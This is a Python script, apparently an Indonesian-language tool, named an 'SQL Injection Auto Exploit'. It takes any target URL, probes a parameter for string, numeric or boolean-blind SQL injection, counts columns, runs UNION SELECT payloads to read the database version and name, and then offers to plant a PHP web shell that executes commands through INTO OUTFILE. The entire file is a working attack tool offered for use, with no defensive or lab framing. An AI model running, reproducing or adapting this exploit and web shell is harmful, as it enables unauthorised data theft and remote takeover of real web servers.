#!/usr/bin/env python3

# MAI - SQL Injection Scanner
# Author: fanky
# Inspired by sqlmap, muani, psql-pro
# Versi: 2.0 (2026)

import sys
import re
import time
import random
import urllib.parse
import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

TIMEOUT = 15
RETRIES = 2
DELAY = 0.5

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
]

class Color:
    G = '\033[92m'
    R = '\033[91m'
    Y = '\033[93m'
    B = '\033[94m'
    C = '\033[96m'
    W = '\033[97m'
    X = '\033[0m'
    BD = '\033[1m'

def info(msg):
    print(f"{Color.G}[INFO]{Color.X} {msg}")

def error(msg):
    print(f"{Color.R}[ERROR]{Color.X} {msg}")

def ok(msg):
    print(f"{Color.B}[SUCCESS]{Color.X} {msg}")

def debug(msg):
    print(f"{Color.C}[DEBUG]{Color.X} {msg}")

def banner():
    print(f"{Color.BD}{Color.C}")
    print("    ╔════════════════════════════════════════════════════╗")
    print("    ║   MAI - SQL Injection Auto Exploit                 ║")
    print("    ║   Author: fanky                                     ║")
    print("    ║   Tahun: 2026                                       ║")
    print("    ╚════════════════════════════════════════════════════╝")
    print(f"{Color.X}")

def get_session():
    s = requests.Session()
    s.verify = False
    s.headers.update({'User-Agent': random.choice(USER_AGENTS)})
    return s

def fetch(s, url, params=None):
    try:
        time.sleep(DELAY)
        if params:
            resp = s.get(url, params=params, timeout=TIMEOUT, allow_redirects=True)
        else:
            resp = s.get(url, timeout=TIMEOUT, allow_redirects=True)
        resp.encoding = 'utf-8'
        return resp.text, resp.status_code
    except Exception as e:
        error(f"Request error: {str(e)[:80]}")
        return None, 500

def extract_params(url):
    parsed = urllib.parse.urlparse(url)
    if not parsed.query:
        return None, None
    qs = urllib.parse.parse_qs(parsed.query)
    params = {k: v[0] for k, v in qs.items()}
    base = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
    return base, params

def build_url(base, params):
    q = urllib.parse.urlencode(params)
    return f"{base}?{q}" if q else base

def detect_type(s, base, param, orig_val, orig_html):
    info("Mencari Metode Injection...")
    tests = {
        "string": f"'{orig_val}'",
        "numeric": f"{orig_val} AND 1=1",
        "string2": f"{orig_val}' AND '1'='1"
    }
    for t, val in tests.items():
        p = {param: val}
        url2 = build_url(base, p)
        html, code = fetch(s, url2)
        if html and html != orig_html and code == 200:
            if t.startswith("string"):
                ok("Tipe Injeksi: String Based (quote tunggal)")
                return "string", "'"
            else:
                ok("Tipe Injeksi: Numeric Based")
                return "numeric", ""
    info("Coba Boolean Blind...")
    p_true = {param: f"{orig_val} AND 1=1"}
    p_false = {param: f"{orig_val} AND 1=2"}
    ht, _ = fetch(s, build_url(base, p_true))
    hf, _ = fetch(s, build_url(base, p_false))
    if ht and hf and ht != hf:
        ok("Tipe Injeksi: Boolean-Based Blind")
        return "boolean", ""
    error("Tidak bisa deteksi tipe injeksi.")
    return None, None

def count_cols(s, base, param, orig_val, itype, quote):
    info("Mencari Column...")
    maxc = 30
    for c in range(1, maxc+1):
        if itype == "string":
            pay = f"{quote}{orig_val}{quote} ORDER BY {c}-- -"
        else:
            pay = f"{orig_val} ORDER BY {c}-- -"
        p = {param: pay}
        url2 = build_url(base, p)
        html, code = fetch(s, url2)
        if code != 200 or (html and ("Unknown column" in html or "error" in html.lower())):
            info(f"Order By: {c-1}")
            return c-1
    info(f"Jumlah column (estimasi): {maxc}")
    return maxc

def union_extract(s, base, param, orig_val, itype, quote, cols):
    info("Mencoba Payload Union...")
    marks = ','.join([str(i*11) for i in range(1, cols+1)])
    if itype == "string":
        pay = f"{quote}{orig_val}{quote} UNION SELECT {marks}-- -"
    else:
        pay = f"{orig_val} UNION SELECT {marks}-- -"
    p = {param: pay}
    url2 = build_url(base, p)
    info(f"Payload: {pay[:100]}...")
    html, code = fetch(s, url2)
    if html and code == 200:
        found = re.findall(r'\b(11|22|33|44|55|66|77|88|99|110|121|132)\b', html)
        if found:
            ok(f"Angka muncul: {', '.join(set(found))}")
            info(f"Union URL: {url2}")
            return html
    return None

def dump_db(s, base, param, orig_val, itype, quote, cols):
    info("Menggali info database...")
    if itype == "string":
        pay = f"{quote}{orig_val}{quote} UNION SELECT NULL,@@version,NULL-- -"
    else:
        pay = f"{orig_val} UNION SELECT NULL,@@version,NULL-- -"
    p = {param: pay}
    html, _ = fetch(s, build_url(base, p))
    if html:
        m = re.search(r'(\d+\.\d+\.\d+.*MariaDB|\d+\.\d+\.\d+.*MySQL)', html, re.I)
        p = re.search(r'PostgreSQL (\d+\.\d+)', html, re.I)
        if m:
            ok(f"DBMS: MySQL/MariaDB - {m.group(1)}")
        elif p:
            ok(f"DBMS: PostgreSQL - {p.group(1)}")
        else:
            info("DBMS tidak dikenal.")
    # coba ambil database name
    if itype == "string":
        pay2 = f"{quote}{orig_val}{quote} UNION SELECT NULL,database(),NULL-- -"
    else:
        pay2 = f"{orig_val} UNION SELECT NULL,database(),NULL-- -"
    p2 = {param: pay2}
    html2, _ = fetch(s, build_url(base, p2))
    if html2:
        dbn = re.search(r'([a-zA-Z0-9_\-]+)', html2)
        if dbn:
            ok(f"Database: {dbn.group(1)}")

def upload_shell(s, base, param, orig_val, itype, quote, cols):
    info("Mengupload dios...")
    shell = "<?php if(isset($_GET['cmd'])){system($_GET['cmd']);}?>"
    paths = [
        "/var/www/html/shell.php",
        "/var/www/shell.php",
        "/home/public_html/shell.php",
        "C:/xampp/htdocs/shell.php"
    ]
    for path in paths:
        nulls = ','.join(['NULL'] * (cols - 1))
        if itype == "string":
            pay = f"{quote}{orig_val}{quote} UNION SELECT '{shell}',{nulls} INTO OUTFILE '{path}'-- -"
        else:
            pay = f"{orig_val} UNION SELECT '{shell}',{nulls} INTO OUTFILE '{path}'-- -"
        p = {param: pay}
        url2 = build_url(base, p)
        html, code = fetch(s, url2)
        if code == 200 and html and "error" not in html.lower():
            ok(f"Shell uploaded: {path}")
            info(f"Coba akses: {path}?cmd=id")
            return True
    error("Gagal upload shell (periksa hak FILE).")
    return False

def main():
    banner()
    target = input(f"{Color.Y}Masukkan URL target (contoh: https://site.com/page.php?id=1){Color.X}\nURL> ").strip()
    if not target:
        error("URL kosong!")
        sys.exit(1)
    if not target.startswith(('http://','https://')):
        target = 'http://' + target
    info(f"Mulai scan: {target}")
    base, params = extract_params(target)
    if not params:
        error("URL tidak punya parameter (harus ada ?id=1 dll)")
        sys.exit(1)
    info("Url memiliki parameter")
    s = get_session()
    orig_html, code = fetch(s, target)
    if not orig_html:
        error("Gagal ambil konten default")
        sys.exit(1)
    info("Konten default berhasil diambil")
    param_name = list(params.keys())[0]
    orig_val = params[param_name]
    info(f"Parameter: {param_name}={orig_val}")
    itype, quote = detect_type(s, base, param_name, orig_val, orig_html)
    if not itype:
        error("Tidak rentan SQL Injection?")
        sys.exit(1)
    cols = count_cols(s, base, param_name, orig_val, itype, quote)
    if cols < 1:
        error("Tidak bisa hitung kolom")
        sys.exit(1)
    info(f"Jumlah Column: {cols}")
    union_res = union_extract(s, base, param_name, orig_val, itype, quote, cols)
    if union_res:
        dump_db(s, base, param_name, orig_val, itype, quote, cols)
        print(f"{Color.Y}Upload webshell? (y/n): {Color.X}", end='')
        ans = input().strip().lower()
        if ans == 'y':
            upload_shell(s, base, param_name, orig_val, itype, quote, cols)
    else:
        error("UNION gagal, mungkin butuh blind injection")
    info("Scan selesai.")

if __name__ == "__main__":
    main()
